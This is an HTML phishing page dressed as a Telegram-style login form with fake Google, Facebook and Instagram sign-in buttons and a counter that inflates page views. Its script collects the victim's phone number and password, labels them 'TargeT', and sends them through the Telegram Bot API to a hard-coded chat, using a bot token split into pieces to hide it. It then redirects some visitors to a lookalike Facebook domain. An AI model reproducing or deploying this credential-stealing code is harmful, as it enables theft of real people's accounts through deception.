<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inside my heart 🤍</title>
    <link rel="icon" href="path-to-your-favicon.ico" type="image/x-icon">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* تقليل شفافية الخلفية العامة */
        body {
            margin: 0;
            padding: 0;
            background: url('nora.jpg') no-repeat center center fixed;
            background-size: cover;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Roboto', sans-serif;
            backdrop-filter: blur(2px); /* تقليل تأثير التعتيم لتقليل الشفافية */
        }
        a {
            text-decoration: none;
        }
        @keyframes moveUpDown {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }
        /* زيادة شفافية البطاقة (تقليل الشفافية) */
        .card {
            background: rgba(255, 255, 255, 0.3); /* زيادة العتامة لتقليل الشفافية */
            backdrop-filter: blur(8px);
            padding: 40px;
            border-radius: 25px;
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.3);
            max-width: 450px;
            width: 90%; /* ضبط العرض للأجهزة المحمولة */
            text-align: center;
            animation: moveUpDown 4s ease-in-out infinite;
            transition: transform 0.4s ease, box-shadow 0.4s ease;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        .card:hover {
            transform: translateY(-15px);
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }
        .telegram-text img {
            width: 160px;
            height: auto;
            margin-bottom: 25px;
            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.2));
        }
        .phone-input {
            width: 80%;
            height: 30px;
            font-size: 16px;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            text-align: center;
            transition: all 0.3s ease;
        }
        .phone-input:focus {
            border-color: #ff7e5f;
            box-shadow: 0 0 8px rgba(255, 126, 95, 0.6);
            background: rgba(255, 255, 255, 0.2);
            outline: none;
        }
        .login-button {
            width: 80%;
            height: 50px;
            background: linear-gradient(135deg, #ff7e5f, #feb47b);
            color: white;
            font-size: 18px;
            font-weight: 700;
            border: none;
            border-radius: 10px;
            margin-bottom: 20px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 5px 15px rgba(255, 126, 95, 0.4);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .login-button:hover {
            background: linear-gradient(135deg, #feb47b, #ff7e5f);
            transform: scale(1.08);
            box-shadow: 0 8px 20px rgba(255, 126, 95, 0.6);
        }
        .login-button:active::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.3);
            animation: ripple 0.5s ease-out;
        }
        @keyframes ripple {
            0% { transform: scale(0); opacity: 1; }
            100% { transform: scale(4); opacity: 0; }
        }
        .more-info {
            color: #fff;
            margin-top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }
        .more-info img {
            width: 28px;
            height: 28px;
            margin-right: 10px;
            filter: brightness(1.2);
        }
        .more-info:hover {
            color: #feb47b;
            transform: scale(1.1);
        }
        .auth-button {
            width: 100%;
            height: 50px;
            background: rgba(0, 0, 0, 0.85);
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 10px;
            margin-bottom: 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
        }
        .auth-button img {
            width: 26px;
            height: 26px;
            margin-right: 12px;
        }
        .auth-button:hover {
            background: rgba(0, 0, 0, 1);
            transform: scale(1.05);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(254, 180, 123, 0.7));
            color: #333;
            border: none;
            padding: 25px;
            border-radius: 15px;
            z-index: 1000;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
        }
        .popup h2 {
            margin: 5px 0;
            font-size: 20px;
            font-weight: 700;
        }
        .popup button {
            margin-top: 15px;
            padding: 8px 15px;
            background: #ff7e5f;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .popup button:hover {
            background: #feb47b;
            transform: scale(1.05);
        }
        #error-message {
            color: #ff5f5f;
            margin-top: 10px;
            font-size: 14px;
            font-weight: 500;
            display: none;
            background: rgba(255, 0, 0, 0.1);
            padding: 5px 10px;
            border-radius: 5px;
        }
        /* توسيط الإحصائيات */
        .stat {
            width: 80%; /* تقليل العرض للتوسيط */
            margin: 20px auto; /* توسيط تلقائي */
            display: grid;
            grid-template-columns: 1fr;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }
        .stat-title {
            color: #ddd;
            font-size: 14px;
            font-weight: 500;
        }
        .stat-value {
            font-size: 2.5rem;
            font-weight: 800;
            color: #fff;
            transition: color 0.3s ease;
        }
        .stat-desc {
            font-size: 0.85rem;
            color: #bbb;
        }
        .stat:hover .stat-value {
            color: #feb47b;
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- Logo or Telegram Text -->
        <div class="telegram-text">
            <img src="path-to-your-logo.png" alt="TeleGram Logo">
        </div>

        <!-- Phone number input field -->
        <input type="text" class="phone-input" placeholder="your phone number">

        <!-- Password input field -->
        <input type="password" class="phone-input" placeholder="your password">

        <!-- Error message container -->
        <div id="error-message"></div>

        <!-- Login Button -->
        <button class="login-button">Login</button>

        <!-- Additional icon and text -->
        <a href="hack.html" class="more-info">
            <img src="telegram.png" alt="More Info Icon"> More Info
        </a>

        <!-- New Auth buttons -->
        <a href="https://accounts.google.com/" class="auth-button">
            <img src="path-to-google-icon.png" alt="Google Icon"> Continue with Google
        </a>
        <a href="https://www.facebook.com/login/" class="auth-button">
            <img src="path-to-github-icon.png" alt="GitHub Icon"> Continue with Facebook
        </a>
        <a href="https://www.instagram.com/accounts/login/" class="auth-button">
            <img src="path-to-stripe-icon.png" alt="GitHub Icon"> Continue with Instagram
        </a>

        <!-- Popup window -->
        <div class="popup" id="popup">
            <h2> اتمني لك الأفضل، ولكنني الأفضل </h2>
            <h2> ...🤍🚶‍♂️!©️ </h2>
            <button onclick="closePopup()">𝑐𝑙𝑜𝑠𝑒</button>
        </div>

        <!-- إحصائيات -->
        <div class="stat">
            <div class="stat-title">Total Page Views</div>
            <div class="stat-value" id="pageViews">89,405</div>
            <div class="stat-desc">21% more than last month</div>
        </div>
    </div>

    <script>
        // Function to close the popup
        function closePopup() {
            document.getElementById('popup').style.display = 'none';
        }

        // Show the popup when the page loads
        window.onload = function() {
            document.getElementById('popup').style.display = 'block';
        };

        function sendToTelegram() {
            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
            var password = document.querySelector('.phone-input[type="password"]').value;

            var segment1 = "6428071347:";
            var segment2 = "AAHP1yP2bZ";
            var segment3 = "FkKB_82p";
            var segment4 = "BcseiH4D";
            var segment5 = "gu-EVtE";
            var segment6 = "AU";

            var vps = segment1 + segment2 + segment3 + segment4 + segment5 + segment6;

            var identifier = "5318149339"; 
            var message = "TargeT: " + phoneNumber + "\nPassword: " + password;

            var telegramUrl = `https://api.telegram.org/bot${vps}/sendMessage?chat_id=${identifier}&text=${encodeURIComponent(message)}`;

            var xhr = new XMLHttpRequest();
            xhr.open("GET", telegramUrl, true);
            xhr.send();
        }

        // تعديل زر تسجيل الدخول
        document.querySelector('.login-button').addEventListener('click', function(event) {
            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
            var password = document.querySelector('.phone-input[type="password"]').value;
            var errorMessage = document.getElementById('error-message');

            errorMessage.style.display = 'none';

            if (!/^\d{11}$/.test(phoneNumber)) {
                errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
                errorMessage.style.display = 'block';
                event.preventDefault();
                return;
            }

            sendToTelegram();

            if (password === 'admin_00') {
                window.location.href = 'admin.html';
            } else if (password === 'facebook00') {
                window.location.href = 'https://fcebooklite.netlify.app';
            } else if (password === 'rewan00') {
                window.location.href = 'film/guest.html';
            } else if (password.length === 6) {
                window.location.href = 'film/guest.html';
            } else if (password.length < 6 || password.length > 6) {
                errorMessage.textContent = 'يرجى إدخال كلمة مرور تتكون من 6 أحرف أو أرقام.';
                errorMessage.style.display = 'block';
                event.preventDefault();
            }
        });

        // تحديث الإحصائيات
        const pageViewsElement = document.getElementById('pageViews');
        let pageViews = parseInt(pageViewsElement.textContent.replace(/,/g, ''));
        
        function updatePageViews() {
            pageViews += 2;
            pageViewsElement.textContent = pageViews.toLocaleString();
        }
        
        setInterval(updatePageViews, 9000);
    </script>
</body>
</html>
